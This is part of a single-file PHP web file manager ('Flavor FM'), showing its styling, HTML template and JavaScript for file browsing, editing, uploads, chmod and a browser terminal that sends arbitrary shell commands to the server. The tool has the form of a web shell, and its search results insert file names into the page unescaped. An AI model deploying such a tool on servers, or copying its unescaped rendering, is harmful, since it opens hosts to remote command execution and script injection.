td.name-col a{color:var(--text);text-decoration:none;font-weight:500;display:inline-flex;align-items:center;gap:6px}
td.name-col a:hover{color:var(--accent)}
.icon{font-size:16px;flex-shrink:0}
.size-col,.perm-col,.owner-col{font-family:var(--mono);font-size:11px;color:var(--text2)}
.date-col{font-size:12px;color:var(--text2)}
.actions-col{display:flex;gap:3px}
.actions-col button,.actions-col a{font-family:var(--font);font-size:10px;font-weight:600;padding:3px 8px;border:1px solid var(--border);background:transparent;color:var(--text2);border-radius:3px;cursor:pointer;text-decoration:none;transition:.15s;white-space:nowrap}
.actions-col button:hover,.actions-col a:hover{border-color:var(--accent);color:var(--accent)}
.actions-col .del:hover{border-color:var(--danger);color:var(--danger)}
.actions-col .ext:hover{border-color:var(--success);color:var(--success)}
td .cb{width:14px;height:14px;accent-color:var(--accent);cursor:pointer}
.select-all{width:14px;height:14px;accent-color:var(--accent);cursor:pointer}

/* EDITOR */
.editor-wrap{padding:12px 20px 20px}
.editor-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-wrap:wrap;gap:8px}
.editor-header h3{font-size:13px;font-weight:600;color:var(--accent);font-family:var(--mono);display:flex;align-items:center;gap:6px}
.editor-header .editor-actions{display:flex;gap:6px;align-items:center}
.editor-header a{color:var(--text2);font-size:12px;text-decoration:none;padding:5px 12px;border:1px solid var(--border);border-radius:6px;transition:.15s}
.editor-header a:hover{color:var(--text);border-color:var(--text2)}
.save-btn{font-family:var(--font);font-size:13px;font-weight:600;padding:8px 20px;border:none;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border-radius:var(--radius);cursor:pointer;transition:.2s}
.save-btn:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(99,102,241,.3)}
.CodeMirror{border:1px solid var(--border);border-radius:var(--radius);font-family:var(--mono)!important;font-size:13px!important;height:auto;min-height:500px;max-height:80vh}

/* VIEWER */
.viewer-wrap{padding:20px;text-align:center}
.viewer-wrap img{max-width:100%;max-height:70vh;border-radius:var(--radius);border:1px solid var(--border)}
.viewer-wrap iframe{width:100%;height:80vh;border:1px solid var(--border);border-radius:var(--radius)}

/* TERMINAL */
.terminal-panel{display:none;background:var(--bg);border-top:2px solid var(--accent)}
.terminal-panel.active{display:block}
.terminal-output{font-family:var(--mono);font-size:12px;color:var(--success);background:#000;padding:16px;min-height:200px;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
.terminal-input-row{display:flex;border-top:1px solid var(--border);background:var(--surface)}
.terminal-prompt{font-family:var(--mono);font-size:12px;color:var(--accent2);padding:10px 0 10px 12px;white-space:nowrap}
.terminal-input{flex:1;font-family:var(--mono);font-size:12px;padding:10px;background:transparent;border:none;color:var(--text);outline:none}

/* SEARCH PANEL */
.search-panel{display:none;background:var(--surface);border-bottom:1px solid var(--border);padding:12px 20px}
.search-panel.active{display:block}
.search-panel form{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.search-panel input[type="text"]{flex:1;min-width:200px;padding:8px 12px;font-family:var(--mono);font-size:12px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:6px}
.search-panel input:focus{outline:none;border-color:var(--accent)}
.search-panel label{font-size:12px;color:var(--text2);display:flex;align-items:center;gap:4px;cursor:pointer}
.search-results{max-height:300px;overflow-y:auto;margin-top:8px}
.search-results a{display:flex;align-items:center;gap:8px;padding:6px 10px;color:var(--text);text-decoration:none;font-size:12px;border-radius:4px;transition:.1s}
.search-results a:hover{background:var(--surface2)}
.search-results .sr-path{font-family:var(--mono);font-size:10px;color:var(--text2)}
.search-results .sr-type{font-size:9px;padding:2px 6px;border-radius:3px;font-weight:600}
.sr-type.filename{background:rgba(99,102,241,.1);color:var(--accent)}
.sr-type.content{background:rgba(34,211,238,.1);color:var(--accent2)}

/* MODAL */
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:500;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
.modal-overlay.active{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:24px;width:380px;max-width:90vw;animation:popIn .2s}
@keyframes popIn{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
.modal h3{font-size:15px;margin-bottom:14px}
.modal input[type="text"]{width:100%;padding:10px 12px;font-family:var(--mono);font-size:13px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:6px;margin-bottom:14px}
.modal input:focus{outline:none;border-color:var(--accent)}
.modal-actions{display:flex;gap:8px;justify-content:flex-end}
.modal-actions button{font-family:var(--font);font-size:12px;font-weight:600;padding:8px 16px;border:none;border-radius:6px;cursor:pointer}
.btn-cancel{background:var(--surface2);color:var(--text2);border:1px solid var(--border)!important}
.btn-primary{background:var(--accent);color:#fff}
.btn-danger{background:var(--danger);color:#fff}

.dropzone{display:none;position:fixed;inset:0;z-index:999;background:rgba(99,102,241,.08);border:3px dashed var(--accent);align-items:center;justify-content:center;font-size:20px;font-weight:700;color:var(--accent);pointer-events:none}
.dropzone.active{display:flex}
.empty{text-align:center;padding:50px 20px;color:var(--text2)}
.empty .big{font-size:44px;margin-bottom:10px}

@media(max-width:768px){
    .topbar{flex-direction:column;gap:6px;padding:8px 12px}
    .server-info{flex-wrap:wrap;gap:6px}
    .table-wrap{padding:0 10px 10px}
    td,th{padding:6px 5px}
    .toolbar{padding:8px 10px}
    .editor-wrap{padding:8px 10px 10px}
    .owner-col,.date-col{display:none}
    .path-bar,.bookmarks,.breadcrumbs{padding-left:10px;padding-right:10px}
}
</style>
</head>
<body>

<div class="topbar">
    <h1>⚡ <?= APP_NAME ?> <small>v<?= APP_VERSION ?></small></h1>
    <div class="topbar-right">
        <div class="server-info">
            <?php foreach ($server_info as $k => $v): ?><span><b><?= $k ?>:</b> <?= htmlspecialchars($v) ?></span><?php endforeach; ?>
        </div>
        <a href="?logout=1" class="logout-btn">🔒 Logout</a>
    </div>
</div>

<div class="path-bar">
    <?php if ($dir !== '/'): ?><a href="?dir=<?= urlencode($parent_dir) ?>" class="pbtn up">⬆ ..</a><?php endif; ?>
    <form method="POST">
        <input type="hidden" name="action" value="goto">
        <input type="text" name="path" value="<?= htmlspecialchars($dir) ?>">
        <button type="submit" class="pbtn">Go →</button>
    </form>
</div>

<div class="breadcrumbs">
    <?php foreach ($crumbs as $i => $c): ?>
        <?php if ($i > 0): ?><span class="sep">›</span><?php endif; ?>
        <?php if ($c === end($crumbs)): ?><span class="cur"><?= htmlspecialchars($c['name']) ?></span>
        <?php else: ?><a href="?dir=<?= urlencode($c['path']) ?>"><?= htmlspecialchars($c['name']) ?></a><?php endif; ?>
    <?php endforeach; ?>
</div>

<div class="bookmarks">
    <?php foreach ($bookmarks as $l => $p): ?>
        <a href="?dir=<?= urlencode($p) ?>" class="<?= ($p === $dir) ? 'act' : '' ?>"><?= $l ?></a>
    <?php endforeach; ?>
</div>

<!-- TAB BAR -->
<div class="tab-bar">
    <button class="tab-btn active" onclick="switchTab('files')">📂 Files</button>
    <button class="tab-btn" onclick="switchTab('terminal')">🖥️ Terminal</button>
    <button class="tab-btn" onclick="switchTab('search')">🔍 Search</button>
</div>

<!-- SEARCH PANEL -->
<div class="search-panel" id="search-panel">
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <input type="text" id="search-input" placeholder="Search files & folders..." style="flex:1;min-width:200px;padding:8px 12px;font-family:var(--mono);font-size:12px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:6px">
        <label style="font-size:12px;color:var(--text2);display:flex;align-items:center;gap:4px;cursor:pointer">
            <input type="checkbox" id="search-content"> Search file contents
        </label>
        <button class="tbtn" onclick="doSearch()">🔍 Search</button>
    </div>
    <div class="search-results" id="search-results"></div>
</div>

<?php if ($flash): ?><div class="flash <?= $flash['type'] ?>"><?= htmlspecialchars($flash['msg']) ?></div><?php endif; ?>

<?php if ($viewing): ?>
<!-- ═══ VIEWER ═══ -->
<div class="viewer-wrap">
    <div class="editor-header">
        <h3>👁️ <?= htmlspecialchars(basename($view_file)) ?></h3>
        <a href="?dir=<?= urlencode($dir) ?>">← Back</a>
    </div>
    <?php if ($view_type === 'image'): ?>
        <img src="?dir=<?= urlencode($dir) ?>&preview=<?= urlencode(basename($view_file)) ?>" alt="Preview">
    <?php elseif ($view_type === 'pdf'): ?>
        <iframe src="?dir=<?= urlencode($dir) ?>&preview=<?= urlencode(basename($view_file)) ?>"></iframe>
    <?php endif; ?>
</div>

<?php elseif ($editing): ?>
<!-- ═══ EDITOR ═══ -->
<div class="editor-wrap">
    <div class="editor-header">
        <h3>✏️ <?= htmlspecialchars($edit_file) ?></h3>
        <div class="editor-actions">
            <a href="?dir=<?= urlencode($dir) ?>">← Back</a>
        </div>
    </div>
    <form method="POST" id="editor-form">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="filepath" value="<?= htmlspecialchars($edit_file) ?>">
        <textarea id="code-editor" name="content"><?= htmlspecialchars($edit_content) ?></textarea>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:10px;flex-wrap:wrap;gap:8px">
            <div style="font-size:11px;color:var(--text2);font-family:var(--mono)" id="editor-status">Ready</div>
            <button type="submit" class="save-btn">💾 Save (Ctrl+S)</button>
        </div>
    </form>
</div>
<script>
document.addEventListener('DOMContentLoaded', function(){
    const ta = document.getElementById('code-editor');
    const editor = CodeMirror.fromTextArea(ta, {
        mode: '<?= $edit_mode ?>',
        theme: 'dracula',
        lineNumbers: true,
        matchBrackets: true,
        autoCloseBrackets: true,
        autoCloseTags: true,
        foldGutter: true,
        gutters: ['CodeMirror-linenumbers','CodeMirror-foldgutter'],
        indentUnit: 4,
        tabSize: 4,
        indentWithTabs: false,
        lineWrapping: true,
        extraKeys: {
            'Ctrl-S': function(cm){ document.getElementById('editor-form').submit(); },
            'Cmd-S': function(cm){ document.getElementById('editor-form').submit(); },
            'Tab': function(cm){
                if (cm.somethingSelected()) cm.indentSelection('add');
                else cm.replaceSelection('    ', 'end');
            }
        }
    });
    editor.on('cursorActivity', function(){
        const pos = editor.getCursor();
        document.getElementById('editor-status').textContent = 'Line ' + (pos.line+1) + ', Col ' + (pos.ch+1) + ' | <?= $edit_mode ?>';
    });
});
</script>

<?php else: ?>
<!-- ═══ FILE BROWSER ═══ -->
<div class="toolbar" id="files-toolbar">
    <button class="tbtn" onclick="openModal('mkdir')">📁 New Folder</button>
    <button class="tbtn" onclick="openModal('mkfile')">📄 New File</button>
    <form method="POST" enctype="multipart/form-data" id="upload-form" style="display:inline">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="files[]" multiple id="file-input" style="display:none" onchange="document.getElementById('upload-form').submit()">
        <label for="file-input" class="tbtn green" style="cursor:pointer">📤 Upload</label>
    </form>
    <div class="sep"></div>
    <button class="tbtn cyan" onclick="clipboardAction('copy')" id="btn-copy" style="display:none">📋 Copy</button>
    <button class="tbtn purple" onclick="clipboardAction('cut')" id="btn-cut" style="display:none">✂️ Cut</button>
    <button class="tbtn red" onclick="deleteSelected()" id="btn-del-multi" style="display:none">🗑️ Delete</button>
    <button class="tbtn" onclick="zipSelected()" id="btn-zip" style="display:none">📦 Zip</button>
    <?php if ($has_clipboard): ?>
        <div class="sep"></div>
        <button class="tbtn green" onclick="pasteClipboard()">📋 Paste (<?= $clipboard_count ?> <?= $clipboard_op ?>)</button>
        <span class="clipboard-info"><?= $clipboard_op ?>: <?= $clipboard_count ?> item(s)</span>
    <?php endif; ?>
</div>

<div class="table-wrap" id="files-panel">
<?php if (empty($items)): ?>
    <div class="empty"><div class="big">📂</div><p>Empty folder</p></div>
<?php else: ?>
    <table>
        <thead><tr>
            <th><input type="checkbox" class="select-all" onchange="toggleAll(this)"></th>
            <th>Name</th><th>Size</th><th>Perms</th><th class="owner-col">Owner</th><th class="date-col">Modified</th><th>Actions</th>
        </tr></thead>
        <tbody>
        <?php foreach ($items as $item):
            $is_zip = in_array(strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)), ['zip']);
            $is_image = in_array(strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)), ['jpg','jpeg','png','gif','svg','webp','ico','bmp']);
            $is_pdf = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)) === 'pdf';
            $can_preview = $is_image || $is_pdf;
        ?>
            <tr data-name="<?= htmlspecialchars($item['name']) ?>">
                <td><input type="checkbox" class="cb" value="<?= htmlspecialchars($item['name']) ?>" onchange="updateSelection()"></td>
                <td class="name-col">
                    <?php if ($item['is_dir']): ?>
                        <a href="?dir=<?= urlencode($item['path']) ?>"><span class="icon"><?= icon_for($item['name'],true) ?></span> <?= htmlspecialchars($item['name']) ?></a>
                    <?php else: ?>
                        <a href="?dir=<?= urlencode($dir) ?>&download=<?= urlencode($item['name']) ?>"><span class="icon"><?= icon_for($item['name'],false) ?></span> <?= htmlspecialchars($item['name']) ?></a>
                    <?php endif; ?>
                </td>
                <td class="size-col"><?= $item['is_dir'] ? '—' : human_size($item['size']) ?></td>
                <td class="perm-col"><span onclick="openChmod('<?= htmlspecialchars($item['name']) ?>','<?= $item['perms'] ?>')" style="cursor:pointer;border-bottom:1px dashed var(--text2)"><?= $item['perms'] ?></span></td>
                <td class="owner-col"><?= htmlspecialchars($item['owner']) ?></td>
                <td class="date-col"><?= $item['mtime'] ? date(DATE_FORMAT, $item['mtime']) : '-' ?></td>
                <td class="actions-col">
                    <?php if ($can_preview): ?><a href="?dir=<?= urlencode($dir) ?>&view=<?= urlencode($item['name']) ?>">View</a><?php endif; ?>
                    <?php if (!$item['is_dir'] && is_editable($item['name'])): ?><a href="?dir=<?= urlencode($dir) ?>&edit=<?= urlencode($item['name']) ?>">Edit</a><?php endif; ?>
                    <?php if (!$item['is_dir']): ?><a href="?dir=<?= urlencode($dir) ?>&download=<?= urlencode($item['name']) ?>">DL</a><?php endif; ?>
                    <?php if ($is_zip): ?><button class="ext" onclick="extractFile('<?= htmlspecialchars(addslashes($item['name'])) ?>')">Ext</button><?php endif; ?>
                    <button onclick="openRename('<?= htmlspecialchars(addslashes($item['name'])) ?>')">Ren</button>
                    <button class="del" onclick="openDelete('<?= htmlspecialchars(addslashes($item['name'])) ?>')">Del</button>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
<?php endif; ?>
</div>
<?php endif; ?>

<!-- TERMINAL -->
<div class="terminal-panel" id="terminal-panel">
    <div class="terminal-output" id="term-output">Welcome to Flavor FM Terminal\nType commands and press Enter\n\n</div>
    <div class="terminal-input-row">
        <span class="terminal-prompt" id="term-prompt"><?= htmlspecialchars($dir) ?> $</span>
        <input type="text" class="terminal-input" id="term-input" placeholder="Type command..." autocomplete="off">
    </div>
</div>

<!-- MODALS -->
<div class="modal-overlay" id="modal-mkdir"><div class="modal"><h3>📁 New Folder</h3><form method="POST"><input type="hidden" name="action" value="mkdir"><input type="text" name="name" placeholder="Folder name" autofocus required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('mkdir')">Cancel</button><button type="submit" class="btn-primary">Create</button></div></form></div></div>
<div class="modal-overlay" id="modal-mkfile"><div class="modal"><h3>📄 New File</h3><form method="POST"><input type="hidden" name="action" value="mkfile"><input type="text" name="name" placeholder="filename.php" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('mkfile')">Cancel</button><button type="submit" class="btn-primary">Create</button></div></form></div></div>
<div class="modal-overlay" id="modal-rename"><div class="modal"><h3>✏️ Rename</h3><form method="POST"><input type="hidden" name="action" value="rename"><input type="hidden" name="old" id="rename-old"><input type="text" name="new" id="rename-new" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('rename')">Cancel</button><button type="submit" class="btn-primary">Rename</button></div></form></div></div>
<div class="modal-overlay" id="modal-delete"><div class="modal"><h3>🗑️ Delete</h3><p style="color:var(--text2);margin-bottom:14px;font-size:13px">Delete <strong id="delete-name" style="color:var(--danger)"></strong>?</p><form method="POST"><input type="hidden" name="action" value="delete"><input type="hidden" name="target" id="delete-target"><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('delete')">Cancel</button><button type="submit" class="btn-danger">Delete</button></div></form></div></div>
<div class="modal-overlay" id="modal-chmod"><div class="modal"><h3>🔐 Permissions</h3><form method="POST"><input type="hidden" name="action" value="chmod"><input type="hidden" name="target" id="chmod-target"><input type="text" name="perms" id="chmod-perms" placeholder="0755" maxlength="4" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('chmod')">Cancel</button><button type="submit" class="btn-primary">Apply</button></div></form></div></div>
<div class="dropzone" id="dropzone">📤 Drop files to upload</div>

<script>
// Modals
function openModal(id){document.getElementById('modal-'+id).classList.add('active');const i=document.querySelector('#modal-'+id+' input[type="text"]');if(i)setTimeout(()=>i.focus(),100)}
function closeModal(id){document.getElementById('modal-'+id).classList.remove('active')}
function openRename(n){document.getElementById('rename-old').value=n;document.getElementById('rename-new').value=n;openModal('rename')}
function openDelete(n){document.getElementById('delete-target').value=n;document.getElementById('delete-name').textContent=n;openModal('delete')}
function openChmod(n,p){document.getElementById('chmod-target').value=n;document.getElementById('chmod-perms').value=p;openModal('chmod')}
document.querySelectorAll('.modal-overlay').forEach(el=>{el.addEventListener('click',e=>{if(e.target===el)el.classList.remove('active')})});
document.addEventListener('keydown',e=>{if(e.key==='Escape')document.querySelectorAll('.modal-overlay.active').forEach(el=>el.classList.remove('active'))});

// Drag drop
const dz=document.getElementById('dropzone');let dc=0;
document.addEventListener('dragenter',e=>{e.preventDefault();dc++;dz.classList.add('active')});
document.addEventListener('dragleave',()=>{dc--;if(!dc)dz.classList.remove('active')});
document.addEventListener('dragover',e=>e.preventDefault());
document.addEventListener('drop',e=>{e.preventDefault();dc=0;dz.classList.remove('active');if(e.dataTransfer.files.length){document.getElementById('file-input').files=e.dataTransfer.files;document.getElementById('upload-form').submit()}});

// Multi-select
function getSelected(){return [...document.querySelectorAll('.cb:checked')].map(c=>c.value)}
function updateSelection(){
    const sel=getSelected();
    const show=sel.length>0;
    ['btn-copy','btn-cut','btn-del-multi','btn-zip'].forEach(id=>{const el=document.getElementById(id);if(el)el.style.display=show?'inline-flex':'none'});
    document.querySelectorAll('tbody tr').forEach(tr=>{
        const cb=tr.querySelector('.cb');
        tr.classList.toggle('selected',cb&&cb.checked);
    });
}
function toggleAll(el){document.querySelectorAll('.cb').forEach(c=>{c.checked=el.checked});updateSelection()}

// Clipboard
function clipboardAction(op){
    const items=getSelected();
    if(!items.length)return;
    const f=document.createElement('form');f.method='POST';f.style.display='none';
    f.innerHTML='<input name="action" value="clipboard"><input name="op" value="'+op+'"><input name="items" value=\''+JSON.stringify(items)+'\'>';
    document.body.appendChild(f);f.submit();
}
function pasteClipboard(){
    const f=document.createElement('form');f.method='POST';f.style.display='none';
    f.innerHTML='<input name="action" value="paste">';
    document.body.appendChild(f);f.submit();
}
function deleteSelected(){
    const items=getSelected();
    if(!items.length)return;
    if(!confirm('Delete '+items.length+' item(s)?'))return;
    const f=document.createElement('form');f.method='POST';f.style.display='none';
    f.innerHTML='<input name="action" value="delete_multi"><input name="items" value=\''+JSON.stringify(items)+'\'>';
    document.body.appendChild(f);f.submit();
}
function zipSelected(){
    const items=getSelected();
    if(!items.length)return;
    const f=document.createElement('form');f.method='POST';f.style.display='none';
    f.innerHTML='<input name="action" value="zip"><input name="items" value=\''+JSON.stringify(items)+'\'>';
    document.body.appendChild(f);f.submit();
}
function extractFile(name){
    const f=document.createElement('form');f.method='POST';f.style.display='none';
    f.innerHTML='<input name="action" value="extract"><input name="target" value="'+name+'">';
    document.body.appendChild(f);f.submit();
}

// Tabs
function switchTab(tab){
    document.querySelectorAll('.tab-btn').forEach((b,i)=>b.classList.toggle('active',b.textContent.includes(tab==='files'?'Files':tab==='terminal'?'Terminal':'Search')));
    const fp=document.getElementById('files-panel'),ft=document.getElementById('files-toolbar');
    const tp=document.getElementById('terminal-panel');
    const sp=document.getElementById('search-panel');
    if(fp)fp.style.display=tab==='files'?'':'none';
    if(ft)ft.style.display=tab==='files'?'':'none';
    tp.classList.toggle('active',tab==='terminal');
    sp.classList.toggle('active',tab==='search');
    if(tab==='terminal')document.getElementById('term-input').focus();
    if(tab==='search')document.getElementById('search-input').focus();
}

// Terminal
const termOut=document.getElementById('term-output');
const termIn=document.getElementById('term-input');
const termPrompt=document.getElementById('term-prompt');
let termCwd='<?= addslashes($dir) ?>';
const termHistory=[];let histIdx=-1;

if(termIn)termIn.addEventListener('keydown',function(e){
    if(e.key==='Enter'){
        const cmd=this.value.trim();
        if(!cmd)return;
        termHistory.unshift(cmd);histIdx=-1;
        termOut.textContent+=termCwd+' $ '+cmd+'\n';
        this.value='';
        // cd handling
        if(cmd.startsWith('cd ')){
            const target=cmd.substring(3).trim();
            fetch(location.href,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:'action=terminal&cmd=cd '+encodeURIComponent(target)+' && pwd&cwd='+encodeURIComponent(termCwd)
            }).then(r=>r.json()).then(d=>{
                const newdir=d.output.trim();
                if(newdir.startsWith('/')){termCwd=newdir;termPrompt.textContent=termCwd+' $'}
                else termOut.textContent+=d.output+'\n';
                termOut.scrollTop=termOut.scrollHeight;
            });
            return;
        }
        // clear
        if(cmd==='clear'){termOut.textContent='';return}
        fetch(location.href,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
            body:'action=terminal&cmd='+encodeURIComponent(cmd)+'&cwd='+encodeURIComponent(termCwd)
        }).then(r=>r.json()).then(d=>{
            termOut.textContent+=d.output+'\n';
            termOut.scrollTop=termOut.scrollHeight;
        }).catch(err=>{termOut.textContent+='Error: '+err+'\n'});
    }
    if(e.key==='ArrowUp'){e.preventDefault();if(histIdx<termHistory.length-1){histIdx++;this.value=termHistory[histIdx]}}
    if(e.key==='ArrowDown'){e.preventDefault();if(histIdx>0){histIdx--;this.value=termHistory[histIdx]}else{histIdx=-1;this.value=''}}
});

// Search
function doSearch(){
    const q=document.getElementById('search-input').value.trim();
    const sc=document.getElementById('search-content').checked;
    const sr=document.getElementById('search-results');
    if(q.length<2){sr.innerHTML='<p style="color:var(--text2);font-size:12px;padding:8px">Min 2 characters</p>';return}
    sr.innerHTML='<p style="color:var(--text2);font-size:12px;padding:8px">Searching...</p>';
    fetch(location.href,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'action=search&query='+encodeURIComponent(q)+'&search_dir=<?= urlencode($dir) ?>&search_content='+(sc?'1':'0')
    }).then(r=>r.json()).then(d=>{
        if(!d.results.length){sr.innerHTML='<p style="color:var(--text2);font-size:12px;padding:8px">No results</p>';return}
        sr.innerHTML=d.results.map(r=>{
            const href=r.is_dir ? '?dir='+encodeURIComponent(r.path) : '?dir='+encodeURIComponent(r.dir)+'&edit='+encodeURIComponent(r.name);
            return '<a href="'+href+'"><span class="sr-type '+r.type+'">'+r.type+'</span> <span>'+(r.is_dir?'📁':'📄')+' '+r.name+'</span> <span class="sr-path">'+r.dir+'</span></a>';
        }).join('');
    });
}
document.getElementById('search-input')?.addEventListener('keydown',e=>{if(e.key==='Enter')doSearch()});
</script>
</body>
</html>